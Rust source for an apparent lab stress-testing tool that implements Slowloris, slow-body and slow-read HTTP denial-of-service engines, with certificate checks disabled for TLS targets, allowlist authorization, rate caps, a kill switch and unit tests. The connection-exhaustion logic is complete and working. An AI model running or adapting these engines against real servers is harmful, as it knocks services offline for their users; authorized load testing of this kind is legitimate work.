//! # Slow-connection L7 primitives — Slowloris & slow-body (isolated-lab use)
//!
//! Low-volume application-layer exhaustion. Instead of completing requests as
//! fast as possible (that is [`crate::L7Engine`]), these primitives open TCP
//! connections and **never finish the request**, dribbling a keep-alive byte
//! every `drip` so the target holds the connection (and its worker/slot) open:
//!
//!   - [`SlowMode::Headers`] — **Slowloris**: send a request line + a `Host`
//!     header but *never* the terminating blank line, trickling one extra header
//!     line per tick. Exercises the server's request-header read timeout.
//!   - [`SlowMode::Body`] — **slow body** (R-U-Dead-Yet style): send complete
//!     headers with a large `Content-Length`, then trickle the body one byte per
//!     tick, never reaching the declared length. Exercises the body read timeout.
//!   - [`SlowMode::Read`] — **slow read**: send a *complete* request, then drain
//!     the response one small chunk per tick while advertising a shrunken receive
//!     window (`SO_RCVBUF`), so the server's send buffer stays full and it cannot
//!     retire the connection. Exercises the response-write / send timeout — the
//!     read-side mirror of slow body.
//!
//! ## Same safety boundary as the fast engine
//!
//! Authorization is identical: the URL host is validated as a **datum**
//! ([`crate::authorize_datum`]) and resolved **once** to a pinned connect
//! address ([`crate::resolve_addrs`]). Connections only ever go to that
//! gate-authorized address. The run is bounded by `duration`, capped by the
//! rate cap (reinterpreted as *connections opened per second*) and by
//! `max_conns` (concurrent ceiling), and aborts promptly on the kill switch.
//!
//! ## `https` targets (slow-TLS)
//!
//! An `https` URL performs a real rustls (ring) handshake over the pinned TCP
//! connection, then dribbles the same slow HTTP bytes *inside* the TLS session.
//! The slow-TLS path **accepts any server certificate**: the safety boundary is
//! *which host we connect to* (already enforced by datum authorization + the
//! pinned connect address), not the peer's identity — and the primitive sends no
//! secrets and reads no response. Requiring a publicly-trusted chain would make
//! it useless against the self-signed / internal-CA certs typical of lab targets.
//! This deliberate choice is scoped to the slow engine; the fast [`crate::L7Engine`]
//! keeps reqwest's normal certificate verification.

use std::net::SocketAddr;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

use tokio::io::{AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::task::JoinSet;
use tokio::time::MissedTickBehavior;
use tokio_rustls::rustls::pki_types::ServerName;
use tokio_rustls::TlsConnector;

use jinrai_core::{Layer, ModuleError, RunPlan, RunReport, StressModule};
use jinrai_safety::Authorization;

use crate::{authorize_datum, resolve_addrs, wait_for_kill, L7Error};

/// Which slow primitive to run.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SlowMode {
    /// Slowloris: partial request headers, never terminated.
    Headers,
    /// Slow body (RUDY): full headers, oversized `Content-Length`, trickled body.
    Body,
    /// Slow read: send a *complete* request, then drain the response one small
    /// chunk per tick with a shrunken receive buffer, so the server cannot flush
    /// its response and holds the connection (and its send buffer) open. This is
    /// the read-side mirror of [`SlowMode::Body`] (slowhttptest's "slow read").
    Read,
}

impl SlowMode {
    fn label(self) -> &'static str {
        match self {
            SlowMode::Headers => "l7-slowloris",
            SlowMode::Body => "l7-slowbody",
            SlowMode::Read => "l7-slowread",
        }
    }

    /// Whether this mode reads the response (slow-read) rather than only writing.
    fn reads(self) -> bool {
        matches!(self, SlowMode::Read)
    }
}

/// Runtime configuration for a slow-connection run.
#[derive(Debug, Clone, Copy)]
pub struct SlowConfig {
    pub mode: SlowMode,
    /// Concurrent connection ceiling. New connections are opened (rate-capped)
    /// up to this many, then the run just keeps them alive until the deadline.
    pub max_conns: usize,
    /// Interval between keep-alive writes on each held connection.
    pub drip: Duration,
}

/// The slow-connection engine. Holds a clone of the gate (the sole authority),
/// the target URL, and the run config.
#[derive(Debug, Clone)]
pub struct L7SlowEngine {
    gate: Authorization,
    url: String,
    cfg: SlowConfig,
}

impl L7SlowEngine {
    pub fn new(gate: Authorization, url: impl Into<String>, cfg: SlowConfig) -> Self {
        Self { gate, url: url.into(), cfg }
    }

    /// Authorize the datum (public so the CLI can fail-closed before any run).
    pub fn authorize_target(&self) -> Result<Vec<jinrai_safety::AuthorizedTarget>, L7Error> {
        Ok(vec![authorize_datum(&self.gate, &self.url)?.target])
    }

    /// Authorize + resolve-once into the pinned connect address and the request
    /// line / Host header used for every connection. For an `https` datum, also
    /// build the TLS connector + SNI server name used for every connection.
    fn prepare(&self) -> Result<Prepared, L7Error> {
        let datum = authorize_datum(&self.gate, &self.url)?;
        let addr = *resolve_addrs(&datum)?.first().expect("resolve_addrs is non-empty");

        let mut target = datum.url.path().to_string();
        if let Some(q) = datum.url.query() {
            target.push('?');
            target.push_str(q);
        }
        if target.is_empty() {
            target.push('/');
        }
        let host_header = match datum.url.port() {
            Some(p) => format!("{}:{}", datum.host, p),
            None => datum.host.clone(),
        };

        // TLS only for https (no ALPN — plain HTTP/1.1 dribble inside the session).
        let tls = if datum.url.scheme() == "https" {
            let connector = TlsConnector::from(crate::tls::client_config(vec![])?);
            let server_name = crate::tls::server_name(&datum)?;
            Some(TlsSetup { connector, server_name })
        } else {
            None
        };

        Ok(Prepared { addr, target, host_header, tls })
    }

    /// This primitive could not start. See [`crate::module_error`] for why the
    /// distinction between a refusal and a setup failure is kept.
    fn refusal(&self, e: L7Error) -> ModuleError {
        crate::module_error(format!("L7 {}", self.cfg.mode.label()), e)
    }
}

struct Prepared {
    addr: SocketAddr,
    target: String,
    host_header: String,
    /// `Some` for an https target: the TLS connector + SNI name for every conn.
    tls: Option<TlsSetup>,
}

/// TLS bits shared across every connection of an https slow run. Cheaply
/// cloneable (`TlsConnector` is an `Arc` inside). The accept-any-certificate
/// config comes from [`crate::tls`] (see there for why that is safe here).
#[derive(Clone)]
struct TlsSetup {
    connector: TlsConnector,
    server_name: ServerName<'static>,
}

impl StressModule for L7SlowEngine {
    fn layer(&self) -> Layer {
        Layer::L7
    }

    fn name(&self) -> &str {
        self.cfg.mode.label()
    }

    fn execute(&mut self, plan: &RunPlan) -> Result<RunReport, ModuleError> {
        let Prepared { addr, target, host_header, tls } = match self.prepare() {
            Ok(p) => p,
            Err(e) => return Err(self.refusal(e)),
        };

        // Rate cap: min spacing between opening connections. `None` => send nothing.
        let Some(open_interval) = plan.rate_cap.min_interval() else {
            return Ok(RunReport {
                layer_label: format!(
                    "L7 {} {} (rate cap 0 — opened nothing)",
                    self.cfg.mode.label(),
                    self.url
                ),
                aborted_early: false,
                ..Default::default()
            });
        };

        let rt = match tokio::runtime::Builder::new_multi_thread().enable_all().build() {
            Ok(rt) => rt,
            Err(e) => return Err(self.refusal(L7Error::Client(e.to_string()))),
        };

        let established = Arc::new(AtomicU64::new(0));
        let errors = Arc::new(AtomicU64::new(0));
        // Write handles move into the runtime; the originals are read back after.
        let established_w = established.clone();
        let errors_w = errors.clone();

        let mode = self.cfg.mode;
        let drip = self.cfg.drip;
        let max_conns = self.cfg.max_conns;
        let duration = plan.duration;
        let kill = plan.kill.clone();
        let target = Arc::new(target);
        let host_header = Arc::new(host_header);

        let aborted = rt.block_on(async move {
            let deadline = crate::deadline_in(duration);
            let mut opener = tokio::time::interval(open_interval);
            opener.set_missed_tick_behavior(MissedTickBehavior::Delay);
            let mut tasks: JoinSet<()> = JoinSet::new();
            let mut opened = 0usize;
            let mut aborted = false;

            // Phase 1: open up to max_conns, respecting the rate cap, kill and deadline.
            while opened < max_conns {
                tokio::select! {
                    _ = opener.tick() => {}
                    _ = wait_for_kill(kill.clone()) => { aborted = true; break; }
                }
                if kill.is_tripped() {
                    aborted = true;
                    break;
                }
                if Instant::now() >= deadline {
                    break;
                }
                opened += 1;
                tasks.spawn(hold_connection(
                    addr,
                    tls.clone(),
                    target.clone(),
                    host_header.clone(),
                    mode,
                    drip,
                    deadline,
                    kill.clone(),
                    established_w.clone(),
                    errors_w.clone(),
                ));
            }

            // Phase 2: keep the connections alive until the deadline (or kill).
            if !aborted {
                let remaining = deadline.saturating_duration_since(Instant::now());
                tokio::select! {
                    _ = tokio::time::sleep(remaining) => {}
                    _ = wait_for_kill(kill.clone()) => { aborted = true; }
                }
            }

            tasks.abort_all();
            while tasks.join_next().await.is_some() {}
            aborted
        });

        Ok(RunReport {
            layer_label: format!(
                "L7 {} {} ({} connection{} held)",
                self.cfg.mode.label(),
                self.url,
                established.load(Ordering::Relaxed),
                if established.load(Ordering::Relaxed) == 1 { "" } else { "s" }
            ),
            units_sent: established.load(Ordering::Relaxed),
            errors: errors.load(Ordering::Relaxed),
            aborted_early: aborted,
            ..Default::default()
        })
    }
}

/// Advertised receive-buffer size for slow-read connections. Set as small as the
/// OS allows so even a modest response cannot be fully buffered: the server's
/// send buffer stays full and it keeps the connection (and a worker) pinned.
/// Best-effort — kernels round up to their own floor.
const SLOW_READ_RCVBUF: usize = 512;

/// Bytes drained per tick in slow-read mode. Small enough that a real response
/// is retired over many ticks, keeping the server writing for the whole run.
const SLOW_READ_CHUNK: usize = 64;

/// Open one connection and keep it busy-but-unfinished until the deadline or
/// kill. Counts a successful connect + opening write as `established`; a failed
/// connect/handshake as an `error`. A mid-run I/O failure (the server timing us
/// out or closing) is the *expected* end of a held connection, not an error — we
/// simply stop.
#[allow(clippy::too_many_arguments)]
async fn hold_connection(
    addr: SocketAddr,
    tls: Option<TlsSetup>,
    target: Arc<String>,
    host_header: Arc<String>,
    mode: SlowMode,
    drip: Duration,
    deadline: Instant,
    kill: jinrai_safety::KillSwitch,
    established: Arc<AtomicU64>,
    errors: Arc<AtomicU64>,
) {
    let connect = tokio::time::timeout(Duration::from_secs(10), TcpStream::connect(addr));
    let tcp = match connect.await {
        Ok(Ok(s)) => s,
        _ => {
            errors.fetch_add(1, Ordering::Relaxed);
            return;
        }
    };

    // Slow-read: shrink the receive window *before* any bytes flow so the server
    // can never flush its whole response. Best-effort; ignore an unsupported OS.
    if mode.reads() {
        let _ = socket2::SockRef::from(&tcp).set_recv_buffer_size(SLOW_READ_RCVBUF);
    }

    // For https, complete the TLS handshake and drive the slow exchange inside
    // the session; for http, drive it in plaintext. `drive_connection` is generic
    // over the concrete stream (TcpStream or TlsStream) so no trait-object boxing
    // is needed. A failed handshake counts as a connect error.
    match tls {
        None => drive_connection(tcp, target, host_header, mode, drip, deadline, kill, &established, &errors).await,
        Some(t) => {
            let handshake =
                tokio::time::timeout(Duration::from_secs(10), t.connector.connect(t.server_name, tcp));
            match handshake.await {
                Ok(Ok(s)) => {
                    drive_connection(s, target, host_header, mode, drip, deadline, kill, &established, &errors).await
                }
                _ => {
                    errors.fetch_add(1, Ordering::Relaxed);
                }
            }
        }
    }
}

/// Write the opening request for `mode`, then sustain the connection one tick at
/// a time until the deadline/kill. Generic over any concrete async stream so both
/// plaintext TCP and TLS sessions share one code path (no boxing / dynamic
/// dispatch). On the opening-write failure it records an `error`; a later I/O
/// failure ends the connection quietly (the server's timeout is the point).
#[allow(clippy::too_many_arguments)]
async fn drive_connection<S: AsyncRead + AsyncWrite + Unpin>(
    mut stream: S,
    target: Arc<String>,
    host_header: Arc<String>,
    mode: SlowMode,
    drip: Duration,
    deadline: Instant,
    kill: jinrai_safety::KillSwitch,
    established: &AtomicU64,
    errors: &AtomicU64,
) {
    // Opening bytes. Headers/Body deliberately never complete the request;
    // Read sends a *complete* request and then drains the response slowly.
    let opening = match mode {
        SlowMode::Headers => {
            // Request line + Host, but NO terminating "\r\n" — the server keeps
            // waiting for the rest of the headers.
            format!("GET {target} HTTP/1.1\r\nHost: {host_header}\r\nUser-Agent: jinrai\r\n")
        }
        SlowMode::Body => {
            // Complete headers with an oversized body length, then trickle the body.
            format!(
                "POST {target} HTTP/1.1\r\nHost: {host_header}\r\n\
                 Content-Type: application/x-www-form-urlencoded\r\n\
                 Content-Length: 1048576\r\n\r\n"
            )
        }
        SlowMode::Read => {
            // A fully-formed GET: the request completes so the server *starts*
            // sending a response, which we then refuse to drain quickly.
            format!(
                "GET {target} HTTP/1.1\r\nHost: {host_header}\r\n\
                 User-Agent: jinrai\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n"
            )
        }
    };
    if stream.write_all(opening.as_bytes()).await.is_err() {
        errors.fetch_add(1, Ordering::Relaxed);
        return;
    }
    established.fetch_add(1, Ordering::Relaxed);

    let mut n = 0u64;
    let mut buf = [0u8; SLOW_READ_CHUNK];
    while Instant::now() < deadline && !kill.is_tripped() {
        tokio::time::sleep(drip).await;
        if kill.is_tripped() {
            break;
        }
        n += 1;
        let progressed = match mode {
            SlowMode::Headers => stream.write_all(format!("X-{n}: {n}\r\n").as_bytes()).await.is_ok(),
            SlowMode::Body => stream.write_all(b"a").await.is_ok(),
            // Drain a small chunk. `Ok(0)` is EOF: the whole response fit despite
            // the shrunken window and the server closed — the connection is done.
            SlowMode::Read => matches!(stream.read(&mut buf).await, Ok(n) if n > 0),
        };
        if !progressed {
            // Server closed us out (timeout / response fully sent) — expected.
            break;
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::{ErrorKind, Read, Write};
    use std::net::TcpListener;
    use std::sync::atomic::AtomicBool;
    use std::thread;

    use jinrai_core::RateCap;
    use jinrai_safety::{Allowlist, KillSwitch};

    fn gate_cidrs(cidrs: &[&str]) -> Authorization {
        Authorization::new(Allowlist::from_cidrs(cidrs).unwrap(), KillSwitch::new())
    }

    fn cfg(mode: SlowMode) -> SlowConfig {
        SlowConfig { mode, max_conns: 2, drip: Duration::from_millis(100) }
    }

    fn plan(gate: &Authorization, url: &str, rate: u64, ms: u64) -> RunPlan {
        let engine = L7SlowEngine::new(gate.clone(), url, cfg(SlowMode::Headers));
        RunPlan {
            targets: engine.authorize_target().expect("authorize"),
            rate_cap: RateCap::new(rate),
            duration: Duration::from_millis(ms),
            kill: KillSwitch::new(),
        }
    }

    #[test]
    fn https_url_now_authorized() {
        // https is supported (slow-TLS); the datum still authorizes normally.
        let engine =
            L7SlowEngine::new(gate_cidrs(&["127.0.0.0/8"]), "https://127.0.0.1/", cfg(SlowMode::Headers));
        assert!(engine.authorize_target().is_ok());
    }

    #[test]
    fn unauthorized_target_refused() {
        // 127.0.0.1 is not inside 10.0.0.0/8 => fail-closed.
        let engine =
            L7SlowEngine::new(gate_cidrs(&["10.0.0.0/8"]), "http://127.0.0.1/", cfg(SlowMode::Headers));
        assert!(engine.authorize_target().is_err());
    }

    #[test]
    fn mode_surfaces_in_name() {
        for (mode, want) in [
            (SlowMode::Headers, "l7-slowloris"),
            (SlowMode::Body, "l7-slowbody"),
            (SlowMode::Read, "l7-slowread"),
        ] {
            let engine = L7SlowEngine::new(gate_cidrs(&["127.0.0.0/8"]), "http://127.0.0.1/", cfg(mode));
            assert_eq!(engine.name(), want);
        }
    }

    #[test]
    fn rate_zero_opens_nothing() {
        let g = gate_cidrs(&["127.0.0.0/8"]);
        let mut engine = L7SlowEngine::new(g.clone(), "http://127.0.0.1:9/", cfg(SlowMode::Headers));
        let report = engine.execute(&plan(&g, "http://127.0.0.1:9/", 0, 100)).expect("the run should execute");
        assert_eq!(report.units_sent, 0);
        assert!(!report.aborted_early);
        assert!(report.layer_label.contains("opened nothing"));
    }

    #[test]
    fn slowloris_holds_connections_to_local_listener() {
        // A bare TCP listener that accepts and holds connections (never replies).
        // The slow engine should establish and keep at least one open.
        let listener = TcpListener::bind(("127.0.0.1", 0)).unwrap();
        let port = listener.local_addr().unwrap().port();
        listener.set_nonblocking(true).unwrap();
        let stop = Arc::new(AtomicBool::new(false));

        let stop_srv = stop.clone();
        let server = thread::spawn(move || {
            let mut held = Vec::new();
            while !stop_srv.load(Ordering::Relaxed) {
                match listener.accept() {
                    Ok((s, _)) => held.push(s),
                    Err(ref e) if e.kind() == ErrorKind::WouldBlock => {
                        thread::sleep(Duration::from_millis(5));
                    }
                    Err(_) => break,
                }
            }
        });

        let url = format!("http://127.0.0.1:{port}/");
        let g = gate_cidrs(&["127.0.0.0/8"]);
        let mut engine = L7SlowEngine::new(g.clone(), url.clone(), cfg(SlowMode::Headers));
        let report = engine.execute(&plan(&g, &url, 50, 700)).expect("the run should execute");

        stop.store(true, Ordering::Relaxed);
        server.join().unwrap();

        assert!(report.units_sent > 0, "should hold at least one connection open");
        assert_eq!(report.errors, 0, "loopback connects should not error");
        assert!(!report.aborted_early);
    }

    #[test]
    fn slowread_drains_a_responding_listener() {
        // A listener that accepts, drains the request, sends a response, then
        // holds the socket open. Slow-read should send a *complete* request
        // (counted established) and drain the response slowly without erroring.
        let listener = TcpListener::bind(("127.0.0.1", 0)).unwrap();
        let port = listener.local_addr().unwrap().port();
        listener.set_nonblocking(true).unwrap();
        let stop = Arc::new(AtomicBool::new(false));

        let stop_srv = stop.clone();
        let server = thread::spawn(move || {
            let mut held = Vec::new();
            while !stop_srv.load(Ordering::Relaxed) {
                match listener.accept() {
                    Ok((mut s, _)) => {
                        let _ = s.set_read_timeout(Some(Duration::from_millis(100)));
                        let mut buf = [0u8; 1024];
                        let _ = s.read(&mut buf); // drain the (complete) request
                        let body = "x".repeat(4096);
                        let resp =
                            format!("HTTP/1.1 200 OK\r\nContent-Length: {}\r\n\r\n{}", body.len(), body);
                        let _ = s.write_all(resp.as_bytes());
                        held.push(s); // keep the connection open
                    }
                    Err(ref e) if e.kind() == ErrorKind::WouldBlock => {
                        thread::sleep(Duration::from_millis(5));
                    }
                    Err(_) => break,
                }
            }
        });

        let url = format!("http://127.0.0.1:{port}/");
        let g = gate_cidrs(&["127.0.0.0/8"]);
        let mut engine = L7SlowEngine::new(
            g.clone(),
            url.clone(),
            SlowConfig { mode: SlowMode::Read, max_conns: 2, drip: Duration::from_millis(50) },
        );
        let report = engine.execute(&plan(&g, &url, 50, 600)).expect("the run should execute");

        stop.store(true, Ordering::Relaxed);
        server.join().unwrap();

        assert!(report.units_sent > 0, "slow-read should establish (send a full request)");
        assert_eq!(report.errors, 0, "loopback connects should not error");
        assert!(!report.aborted_early);
    }
}
